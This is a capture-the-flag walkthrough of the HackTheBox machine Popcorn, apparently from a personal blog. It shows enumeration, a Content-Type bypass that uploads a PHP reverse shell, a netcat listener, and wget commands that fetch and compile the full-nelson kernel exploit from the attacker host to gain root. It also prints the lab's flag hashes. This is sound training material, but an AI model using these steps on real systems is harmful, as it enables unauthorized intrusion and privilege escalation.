---
layout: post
title: HackTheBox Popcorn
date: 2017-03-15
tags: [HackTheBox, Linux]
---

# Machine Synopsis

Popcorn, while not overly complicated, contains quite a bit of content and it can be difficult for some users to locate the proper attack vector at first. This machine mainly focuses on different methods of web exploitation. ([Source](https://www.hackthebox.com/machines/popcorn))

# Enumeration

```bash
┌──(root㉿shiro)-[/home/shiro]
└─# nmap -sC -sV -A 10.10.10.6
Nmap scan report for 10.10.10.6
Host is up (0.0040s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.12 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=4/20%OT=22%CT=1%CU=43492%PV=Y%DS=2%DC=T%G=Y%TM=625FA3E
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=C8%GCD=1%ISR=C9%TI=Z%CI=Z%II=I%TS=8)SEQ(S
OS:P=CB%GCD=1%ISR=D9%TI=Z%II=I%TS=B)OPS(O1=M505ST11NW6%O2=M505ST11NW6%O3=M5
OS:05NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)WIN(W1=16A0%W2=16A0
OS:%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M505NNSNW6%C
OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=
OS:16A0%S=O%A=S+%F=AS%O=M505ST11NW6%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T5(R=N
OS:)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=N)T7(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RI
OS:D=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT     ADDRESS
1   3.70 ms 10.10.14.1
2   4.37 ms 10.10.10.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.18 seconds
```

Here is the default webpage.

![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Popcorn/website.png?raw=true)

Running `gobuster` on the webpage results in an interesting directory called `/torrent`.

```bash
┌──(root㉿shiro)-[/home/shiro]
└─# gobuster dir -u http://10.10.10.6 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
...
/index                (Status: 200) [Size: 177]
/test                 (Status: 200) [Size: 47032]
/torrent              (Status: 301) [Size: 310] [--> http://10.10.10.6/torrent/]
/rename               (Status: 301) [Size: 309] [--> http://10.10.10.6/rename/] 
...
```

![torrent_homepage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Popcorn/torrent_homepage.png?raw=true)

There is an option to sign up for an account.

![sign_up](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Popcorn/sign_up.png?raw=true)

# Exploit

Upon logging into the newly created account, it was observed that there is an upload page.

![torrent_uploadpage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Popcorn/torrent_uploadpage.png?raw=true)

It seems like we can upload a torrent file here, but can we uploading anything else? Uploading a PHP reverse shell returns an error “`This is not a valid torrent file`".

Let’s upload a proper torrent [file](https://webtorrent.io/free-torrents) instead.

![upload_torrent](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Popcorn/upload_torrent.png?raw=true)

It seems that after uploading the torrent, we can edit the torrent!

One of the features allow us to change the screenshot. Perhaps we can do something malicious here?

![edit_torrent](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Popcorn/edit_torrent.png?raw=true)

This time, trying to upload a PHP reverse shell resulted in a “`invalid file`” error. What if we intercepted the request and changed the `Content-Type: application/x-php` to `Content-Type: image/png`?

```http
HTTP/1.1 200 OK
Date: Wed, 20 Apr 2022 06:48:54 GMT
Server: Apache/2.2.12 (Ubuntu)
X-Powered-By: PHP/5.2.10-2ubuntu6.10
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: private
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 138
Connection: close
Content-Type: text/html

Upload: exploit.php<br />Type: image/png<br />Size: 5.3623046875 Kb<br />Upload Completed. <br />Please refresh to see the new screenshot.
```

Great! It works. However, where is the file being uploaded to? Running`Gobuster` on `http://10.10.10.6/torrent/` showed that there is an `/upload` directory.

![torrent_upload_dir](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Popcorn/torrent_upload_dir.png?raw=true)

Execute the reverse shell by clicking on the uploaded file.

```bash
┌──(root㉿shiro)-[/home/shiro]
└─# nc -nlvp 1234       
listening on [any] 1234 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.6] 34129
...
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ uname -r
2.6.31-14-generic-pae
```

# Privilege Escalation

Executed Linux Exploit Suggester to find out some possible vulnerabilities.

```bash
- On local machine - 
$ wget http://10.10.14.9:8000/les.sh
$ chmod +x les.sh
$ ./les.sh
...
Possible Exploits:
cat: write error: Broken pipe
[+] [CVE-2012-0056,CVE-2010-3849,CVE-2010-3850] full-nelson

   Details: http://vulnfactory.org/exploits/full-nelson.c
   Exposure: highly probable
   Tags: [ ubuntu=(9.10|10.10){kernel:2.6.(31|35)-(14|19)-(server|generic)} ],ubuntu=10.04{kernel:2.6.32-(21|24)-server}
   Download URL: http://vulnfactory.org/exploits/full-nelson.c

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

...
```

It seems like the machine is highly likely to be vulnerable to `full-nelson` (local privilege escalation) exploit!

```bash
$ wget http://10.10.14.9:8000/full-nelson.c
$ gcc full-nelson.c -o full-nelson
$ chmod +x full-nelson
$ ./full-nelson
id
uid=0(root) gid=0(root)
cd /home/george
cat user.txt
c1b9db61d386e3f830c010480ab54077
cd /root
cat root.txt
c5ba80b7f9f478d28cbbf7c59df47478
```
